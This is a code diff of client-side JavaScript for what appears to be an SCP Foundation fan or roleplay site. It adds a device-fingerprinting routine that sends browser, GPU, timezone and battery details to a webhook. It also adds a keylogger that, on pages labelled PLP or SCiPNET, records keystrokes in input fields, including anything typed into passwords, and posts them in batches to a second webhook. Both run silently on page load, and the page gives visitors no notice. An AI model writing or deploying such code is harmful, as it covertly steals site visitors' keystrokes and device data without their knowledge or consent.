+                { name: "⚙️ Technical Capabilities", value: `**CPU Cores:** ${technicalCapabilities.cpuCores}\n**Touch Screen:** ${technicalCapabilities.touchScreen}\n**Cookies Enabled:** ${technicalCapabilities.cookiesEnabled}\n**Local Storage:** ${technicalCapabilities.localStorage}\n**Session Storage:** ${technicalCapabilities.sessionStorage}`, inline: false },
+                { name: "🔧 Web Technologies", value: `**Web Workers:** ${webTech.webWorkers}\n**Service Workers:** ${webTech.serviceWorkers}\n**WebAssembly:** ${webTech.webAssembly}\n**WebGL2:** ${webTech.webGL2}\n**WebP Support:** ${webTech.webPSupport}\n**Plugins:** ${webTech.plugins.substring(0, 200)}`, inline: false },
+                { name: "🎨 WebGL Renderer", value: gpuInfo, inline: true },
+                { name: "⚙️ User Preferences", value: `**Dark Mode:** ${userPrefs.darkMode}\n**Reduced Motion:** ${userPrefs.reducedMotion}\n**Do Not Track:** ${userPrefs.doNotTrack}`, inline: true },
+                { name: "🔐 Security & Privacy", value: `**JavaScript Enabled:** ${securityPrivacy.javaScriptEnabled}\n**ActiveX:** ${securityPrivacy.activeX}\n**Java Enabled:** ${securityPrivacy.javaEnabled}\n**Session Persistence:** ${securityPrivacy.sessionPersistence}`, inline: false },
+                { name: "🕐 Timezone Information", value: timezoneInfo.display, inline: false },
+                { name: "🔋 Battery Status", value: batteryInfo, inline: true }
+            ],
+            footer: { text: "SCP Foundation - Complete Device Analysis | RAISA" }
+        };
+        
+        // Send to webhook
         await fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ embeds: [embedData] })
         }).catch(() => {});
-    } catch (error) {} finally {
+        
+    } catch (error) {
+        console.error('Data collection error:', error);
+    } finally {
         dataCollectionInProgress = false;
     }
+}
+
+// ============================================================
+// PAGE TRACKING & KEYLOGGER MODULE
+// ============================================================
+
+let currentPageTracking = { pageType: null, pageName: null };
+let keystrokeBuffer = [];
+let lastKeyLogTime = 0;
+let isKeyloggerActive = false;
+const KEYLOG_THROTTLE = 2000;
+
+function detectPageType() {
+    const url = window.location.href;
+    const path = window.location.pathname;
+    const pageContent = document.body ? document.body.innerText.substring(0, 1000) : '';
+    
+    if (/plp/i.test(url) || /plp/i.test(path)) {
+        if (/plp-l-2/i.test(url)) return { type: 'PLP', name: 'PLP-L-2' };
+        if (/plp-l-3/i.test(url)) return { type: 'PLP', name: 'PLP-L-3' };
+        if (/plp-l-4/i.test(url)) return { type: 'PLP', name: 'PLP-L-4' };
+        if (/plp-l-5/i.test(url)) return { type: 'PLP', name: 'PLP-L-5' };
+        return { type: 'PLP', name: 'PLP-Page' };
+    }
+    
+    if (/scipnet/i.test(url) || /scip-net/i.test(pageContent)) {
+        return { type: 'SCiPNET', name: 'SCiPNET-Page' };
+    }
+    
+    return { type: 'NORMAL', name: 'Standard-Page' };
+}
+
+function shouldActivateKeylogger() {
+    return currentPageTracking.pageType === 'PLP' || currentPageTracking.pageType === 'SCiPNET';
+}
+
+async function sendKeystrokeBatch(batch) {
+    if (batch.length === 0) return;
+    
+    const now = Date.now();
+    if (now - lastKeyLogTime < KEYLOG_THROTTLE) {
+        setTimeout(() => sendKeystrokeBatch(batch), KEYLOG_THROTTLE);
+        return;
+    }
+    
+    lastKeyLogTime = now;
+    const timestamp = new Date().toISOString();
+    const activeEl = document.activeElement;
+    const elementInfo = {
+        type: activeEl?.tagName?.toLowerCase() || 'unknown',
+        name: activeEl?.getAttribute('name') || '',
+        id: activeEl?.id || ''
+    };
+    
+    const embed = {
+        title: "⌨️ KEYSTROKE LOG - Restricted Page",
+        color: 0xff0000,
+        timestamp: timestamp,
+        fields: [
+            { name: "Page", value: `${currentPageTracking.pageType} - ${currentPageTracking.name}`, inline: false },
+            { name: "Input Field", value: `Type: ${elementInfo.type}, Name: ${elementInfo.name || 'N/A'}`, inline: true },
+            { name: "Keystrokes", value: `\`\`\`${batch.join('')}\`\`\``, inline: false },
+            { name: "Session ID", value: sessionStorage.getItem('scp_session_id') || 'N/A', inline: true }
+        ]
+    };
+    
+    try {
+        await fetch(keyloggerWebhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [embed] })
+        });
+    } catch (error) {}
+}
+
+function sanitizeKeystroke(key) {
+    if (['Shift', 'Control', 'Alt', 'Meta'].includes(key)) return null;
+    if (key === 'Enter') return '[ENTER]';
+    if (key === 'Backspace') return '[BACKSPACE]';
+    if (key === 'Tab') return '[TAB]';
+    if (key === 'Escape') return '[ESC]';
+    if (key === 'Space') return ' ';
+    if (key.length === 1) return key;
+    return `[${key.toUpperCase()}]`;
+}
+
+function handleKeyPress(event) {
+    if (!shouldActivateKeylogger()) return;
+    
+    const activeEl = document.activeElement;
+    const isInput = activeEl && (activeEl.tagName === 'INPUT' || activeEl.tagName === 'TEXTAREA' || activeEl.isContentEditable);
+    if (!isInput) return;
+    
+    const sanitized = sanitizeKeystroke(event.key);
+    if (!sanitized) return;
+    
+    keystrokeBuffer.push(sanitized);
+    
+    if (keystrokeBuffer.length >= 7) {
+        sendKeystrokeBatch([...keystrokeBuffer]);
+        keystrokeBuffer = [];
+    }
+}
+
+function flushKeyBuffer() {
+    if (keystrokeBuffer.length > 0 && shouldActivateKeylogger()) {
+        sendKeystrokeBatch([...keystrokeBuffer]);
+        keystrokeBuffer = [];
+    }
+}
+
+function initKeylogger() {
+    if (isKeyloggerActive) return;
+    isKeyloggerActive = true;
+    
+    if (!sessionStorage.getItem('scp_session_id')) {
+        sessionStorage.setItem('scp_session_id', Date.now().toString(36) + Math.random().toString(36).substring(2, 8));
+    }
+    
+    document.addEventListener('keydown', handleKeyPress);
+    window.addEventListener('beforeunload', flushKeyBuffer);
+    document.addEventListener('visibilitychange', () => { if (document.hidden) flushKeyBuffer(); });
 }
 
 // ============================================================
@@ -554,187 +645,37 @@ async function collectInitialData() {
 
 (function() {
     'use strict';
-
-    const PROTECTED_PATTERNS = [
-        /PLP-L-2/i, /PLP[-\s]?L[-\s]?3/i, /PLP[-\s]?L[-\s]?4/i, /PLP[-\s]?L[-\s]?5/i,
-        /L-5T-Code-of-Ethics/i, /L-5T-Lockdown-Response-Code/i,
-        /L-4-Lockdown-Response-Code/i, /3-LRC/i, /2-LRC/i,
-        /L-4-Code-of-Ethics/i, /L3-CoE/i, /L2-CoE/i, /L-1-CoE/i,
-        /scipnet/i, /scip-net/i
-    ];
-
-    const REDACTED_MESSAGES = {
-        'PLP-L-2': 'ACCESS DENIED - Clearance L-2 Required',
-        'PLP-L-3': 'ACCESS DENIED - Clearance L-3 Required',
-        'PLP-L-4': 'ACCESS DENIED - Clearance L-4 Required',
-        'PLP-L-5': 'ACCESS DENIED - Clearance L-5 Required',
-        'default': 'ACCESS DENIED - Restricted Content'
-    };
-
-    let violationDataCache = null;
-
-    async function getViolationData() {
-        if (violationDataCache) return violationDataCache;
-        
-        const ip = await getIPAddress();
-        const location = await getLocationInfo(ip);
-        const timezoneInfo = getTimezoneWithAbbreviation();
-        
-        violationDataCache = { ip, location, timezone: timezoneInfo };
-        return violationDataCache;
-    }
-
-    function detectProtectedContent(url, pageContent) {
-        const haystack = (url + ' ' + (pageContent || '')).toLowerCase();
-        for (const pattern of PROTECTED_PATTERNS) {
-            if (pattern.test(haystack)) {
-                if (/plp-l-2/i.test(haystack)) return 'PLP-L-2';
-                if (/plp-l-3/i.test(haystack)) return 'PLP-L-3';
-                if (/plp-l-4/i.test(haystack)) return 'PLP-L-4';
-                if (/plp-l-5/i.test(haystack)) return 'PLP-L-5';
-                if (/scipnet/i.test(haystack)) return 'SCiPNET';
-                return 'default';
-            }
-        }
-        return null;
-    }
-
-    function isSensitivePage() {
-        if (window._scp_sensitive_cached !== undefined) {
-            return window._scp_sensitive_cached;
-        }
-        
-        const url = window.location.href;
-        const bodyText = document.body ? document.body.innerText.substring(0, 2000) : '';
-        const result = detectProtectedContent(url, bodyText) !== null;
-        window._scp_sensitive_cached = result;
-        return result;
-    }
-
-    async function logViolation(violationType, clearanceLevel) {
-        if (isProcessingViolation) return;
-        isProcessingViolation = true;
-        
-        try {
-            violationCount++;
-            const pageInfo = getCurrentPageInfo();
-            
-            violationHistory.push({
-                type: violationType,
-                level: clearanceLevel,
-                timestamp: Date.now(),
-                page: pageInfo.url.substring(0, 200)
-            });
-            
-            while (violationHistory.length > 10) {
-                violationHistory.shift();
-            }
-            
-            const violationData = await getViolationData();
-            
-            await sendSecurityAlert(
-                violationType, clearanceLevel, violationCount,
-                pageInfo, violationData.ip, violationData.location, violationData.timezone
-            );
-        } catch (error) {} finally {
-            isProcessingViolation = false;
-        }
-    }
-
-    function showWarning(level) {
-        const message = REDACTED_MESSAGES[level] || REDACTED_MESSAGES.default;
-        
-        if (document.querySelector('.scp-security-warning')) return;
-        
-        const warning = document.createElement('div');
-        warning.className = 'scp-security-warning';
-        warning.style.cssText = `
-            position: fixed; top: 0; left: 0; right: 0;
-            background-color: #8b0000; color: white;
-            text-align: center; padding: 12px;
-            z-index: 10000; font-family: monospace;
-            font-weight: bold; font-size: 14px;
-        `;
-        warning.textContent = `${message} | Incident logged.`;
-        document.body.prepend(warning);
-        
-        setTimeout(() => {
-            if (warning && warning.remove) warning.remove();
-        }, 3000);
-    }
-
-    // Initialize page tracking
-    updatePageTracking();
     
-    // Start keylogger if on restricted page
+    // Update page tracking
+    currentPageTracking = detectPageType();
+    
+    // Start keylogger if needed
     if (shouldActivateKeylogger()) {
         initKeylogger();
     }
     
-    // Track page changes (for SPA/navigation)
+    // Monitor page changes
     let lastUrl = window.location.href;
     const observer = new MutationObserver(() => {
         if (window.location.href !== lastUrl) {
             lastUrl = window.location.href;
-            updatePageTracking();
+            currentPageTracking = detectPageType();
             
-            // Re-evaluate keylogger on navigation
             if (shouldActivateKeylogger() && !isKeyloggerActive) {
                 initKeylogger();
             } else if (!shouldActivateKeylogger() && isKeyloggerActive) {
-                // Flush and deactivate if leaving restricted page
-                flushKeyBufferOnExit();
+                flushKeyBuffer();
                 isKeyloggerActive = false;
             }
         }
     });
     observer.observe(document, { subtree: true, childList: true });
-
-    if (!isSensitivePage()) return;
-
-    // Protection measures for sensitive pages
-    document.addEventListener('contextmenu', function(e) {
-        if (e.target.closest('input, textarea')) return true;
-        e.preventDefault();
-        const protectedMatch = detectProtectedContent(window.location.href, document.body?.innerText || '');
-        if (protectedMatch) {
-            logViolation('Right-Click', protectedMatch);
-            showWarning(protectedMatch);
-        }
-        return false;
-    });
-
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-            e.preventDefault();
-            const protectedMatch = detectProtectedContent(window.location.href, document.body?.innerText || '');
-            logViolation('DevTools Attempt', protectedMatch || 'default');
-            showWarning(protectedMatch || 'default');
-            return false;
-        }
-    });
-
-    let devToolsOpen = false;
-    setInterval(function() {
-        const threshold = 160;
-        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
-        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
-        
-        if ((widthThreshold || heightThreshold) && !devToolsOpen) {
-            devToolsOpen = true;
-            const protectedMatch = detectProtectedContent(window.location.href, document.body?.innerText || '');
-            logViolation('DevTools Opened', protectedMatch || 'default');
-            showWarning(protectedMatch || 'default');
-        } else if (!widthThreshold && !heightThreshold) {
-            devToolsOpen = false;
-        }
-    }, 3000);
-
-    console.log('SCP Foundation Security Active');
+    
+    // Collect data after page loads
+    if (!window._scp_data_collected && window.location.hostname !== 'localhost') {
+        window._scp_data_collected = true;
+        setTimeout(() => collectCompleteData(), 1500);
+    }
 })();
 
-// Initial execution
-if (window.location.hostname !== 'localhost' && !window._scp_data_collected) {
-    window._scp_data_collected = true;
-    setTimeout(() => collectInitialData(), 1000);
-}
+console.log('SCP Foundation Security Protocol Active - Complete Protection Enabled');
